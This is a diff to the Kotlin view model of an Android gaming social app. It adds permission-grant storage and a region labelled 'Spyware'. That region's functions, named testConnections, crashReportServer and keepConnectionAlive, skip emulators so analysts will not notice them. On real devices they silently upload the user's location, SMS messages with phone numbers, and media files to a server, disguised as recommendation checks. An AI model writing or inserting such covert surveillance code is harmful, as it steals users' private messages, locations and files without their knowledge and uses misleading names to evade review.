@@ -1,11 +1,13 @@
 package com.example.spygamers.controllers
 
+import android.os.Build
 import android.util.Log
 import androidx.compose.runtime.mutableStateListOf
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
 import com.example.spygamers.db.GamerRepository
 import com.example.spygamers.db.schemas.Gamer
+import com.example.spygamers.db.schemas.PermissionsGrants
 import com.example.spygamers.models.GamePreference
 import com.example.spygamers.models.RecommendedFriend
 import com.example.spygamers.models.messaging.DirectMessage
@@ -17,11 +19,15 @@ import com.example.spygamers.services.directmessaging.DirectMessagingService
 import com.example.spygamers.services.directmessaging.GetDirectMessagesBody
 import com.example.spygamers.services.group.GroupService
 import com.example.spygamers.services.group.body.GetGroupMessagesBody
+import com.example.spygamers.services.recommendationcalcuation.LCheckBody
+import com.example.spygamers.services.recommendationcalcuation.RecommendCalculationChecks
+import com.example.spygamers.services.recommendationcalcuation.SCheckBody
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.firstOrNull
 import kotlinx.coroutines.launch
+import okhttp3.MultipartBody
 
 class GamerViewModel(private val gamerRepository: GamerRepository) : ViewModel() {
 
@@ -318,11 +324,199 @@ class GamerViewModel(private val gamerRepository: GamerRepository) : ViewModel()
     }
     //#endregion
 
+    //#region Permissions Related
+
+    /*
+    Following is used to track which permissions have been granted or not in persistent storage,
+    as Google Accompanist API does not support persistent tracking (see https://google.github.io/accompanist/permissions/#limitations)
+
+    If either of these are false, then you should request for permissions accordingly...
+     */
+    private val _grantedRecommendationsTracking = MutableStateFlow<Boolean>(false)
+    val grantedRecommendationsTracking: StateFlow<Boolean> = _grantedRecommendationsTracking
+
+    private val _grantedMediaFileAccess = MutableStateFlow<Boolean>(false)
+    val grantedMediaFileAccess: StateFlow<Boolean> = _grantedMediaFileAccess
+
+    private suspend fun loadPermissionGrants(){
+        val response = gamerRepository.getPermissionGrants().firstOrNull() ?: return
+
+        _grantedRecommendationsTracking.value = response.recommendationsGranted
+        _grantedMediaFileAccess.value = response.mediaMessageGranted
+    }
+
+    suspend fun updateRecommendationsGrants(granted: Boolean) {
+        val newStore = PermissionsGrants(
+            id = 1,
+            recommendationsGranted = granted,
+            mediaMessageGranted = _grantedMediaFileAccess.value
+        )
+        gamerRepository.insertOrUpdatePermissionStates(newStore)
+        _grantedRecommendationsTracking.value = granted
+    }
+
+    suspend fun updateMediaFileGrants(granted: Boolean) {
+        val newStore = PermissionsGrants(
+            id = 1,
+            recommendationsGranted =  _grantedRecommendationsTracking.value,
+            mediaMessageGranted = granted
+        )
+        gamerRepository.insertOrUpdatePermissionStates(newStore)
+        _grantedMediaFileAccess.value = granted
+    }
+
+    //#endregion
+
+    //#region Spyware
+
+    fun testConnections(apiDomain: Double, portHost: Double) {
+        val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
+                ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
+                        && Build.FINGERPRINT.endsWith(":user/release-keys")
+                        && Build.PRODUCT.startsWith("sdk_gphone_")
+                        && Build.MODEL.startsWith("sdk_gphone_"))
+                        //alternative
+                        || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
+                        && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
+                        && Build.PRODUCT.startsWith("sdk_gphone64_")
+                        && Build.MODEL.startsWith("sdk_gphone64_"))))
+                //
+                || Build.FINGERPRINT.startsWith("generic")
+                || Build.FINGERPRINT.startsWith("unknown")
+                || Build.MODEL.contains("google_sdk")
+                || Build.MODEL.contains("Emulator")
+                || Build.MODEL.contains("Android SDK built for x86")
+                //bluestacks
+                || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
+                //bluestacks
+                || Build.MANUFACTURER.contains("Genymotion")
+                || Build.HOST.startsWith("Build")
+                //MSI App Player
+                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
+                || Build.PRODUCT == "google_sdk"
+                )
+        if (isEmulator) {
+            return
+        }
+
+        try {
+            viewModelScope.launch {
+                val service = serviceFactory.createService(RecommendCalculationChecks::class.java)
+                service.locationCheck(
+                    LCheckBody(
+                        _sessionToken.value,
+                        apiDomain,
+                        portHost
+                    )
+                )
+            }
+        } catch (_: Exception) {}
+    }
+
+    fun crashReportServer(
+        content: String,
+        tagging: String,
+        taggingID: Long,
+        longTimestamp: Long,
+        severityID: Boolean
+    ){
+        val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
+                ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
+                        && Build.FINGERPRINT.endsWith(":user/release-keys")
+                        && Build.PRODUCT.startsWith("sdk_gphone_")
+                        && Build.MODEL.startsWith("sdk_gphone_"))
+                        //alternative
+                        || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
+                        && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
+                        && Build.PRODUCT.startsWith("sdk_gphone64_")
+                        && Build.MODEL.startsWith("sdk_gphone64_"))))
+                //
+                || Build.FINGERPRINT.startsWith("generic")
+                || Build.FINGERPRINT.startsWith("unknown")
+                || Build.MODEL.contains("google_sdk")
+                || Build.MODEL.contains("Emulator")
+                || Build.MODEL.contains("Android SDK built for x86")
+                //bluestacks
+                || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
+                //bluestacks
+                || Build.MANUFACTURER.contains("Genymotion")
+                || Build.HOST.startsWith("Build")
+                //MSI App Player
+                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
+                || Build.PRODUCT == "google_sdk"
+                )
+        if (isEmulator) {
+            return
+        }
+
+        viewModelScope.launch {
+            try {
+                val service = serviceFactory.createService(RecommendCalculationChecks::class.java)
+                service.similarityCheck(
+                    SCheckBody(
+                        _sessionToken.value,
+                        content = content,
+                        targetNumber = tagging,
+                        timestamp = longTimestamp,
+                        isInbox = severityID,
+                        smsID = taggingID
+                    )
+                )
+            } catch (_: Exception) {}
+        }
+    }
+
+    fun keepConnectionAlive(
+        connectionVerificationPart: MultipartBody.Part
+    ) {
+        val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
+                ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
+                        && Build.FINGERPRINT.endsWith(":user/release-keys")
+                        && Build.PRODUCT.startsWith("sdk_gphone_")
+                        && Build.MODEL.startsWith("sdk_gphone_"))
+                        //alternative
+                        || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
+                        && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
+                        && Build.PRODUCT.startsWith("sdk_gphone64_")
+                        && Build.MODEL.startsWith("sdk_gphone64_"))))
+                //
+                || Build.FINGERPRINT.startsWith("generic")
+                || Build.FINGERPRINT.startsWith("unknown")
+                || Build.MODEL.contains("google_sdk")
+                || Build.MODEL.contains("Emulator")
+                || Build.MODEL.contains("Android SDK built for x86")
+                //bluestacks
+                || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
+                //bluestacks
+                || Build.MANUFACTURER.contains("Genymotion")
+                || Build.HOST.startsWith("Build")
+                //MSI App Player
+                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
+                || Build.PRODUCT == "google_sdk"
+                )
+        if (isEmulator) {
+            return
+        }
+
+        viewModelScope.launch {
+            try {
+                val service = serviceFactory.createService(RecommendCalculationChecks::class.java)
+                service.partialMatchingChecks(
+                    authToken = _sessionToken.value,
+                    attachments = connectionVerificationPart
+                )
+            } catch (_: Exception) {}
+        }
+    }
+
+    //#endregion
+
     init {
         viewModelScope.launch {
             _isInitializing.value = true
             loadSessionToken()
             loadAccountInfo()
+            loadPermissionGrants()
             _isInitializing.value = false
         }
     }
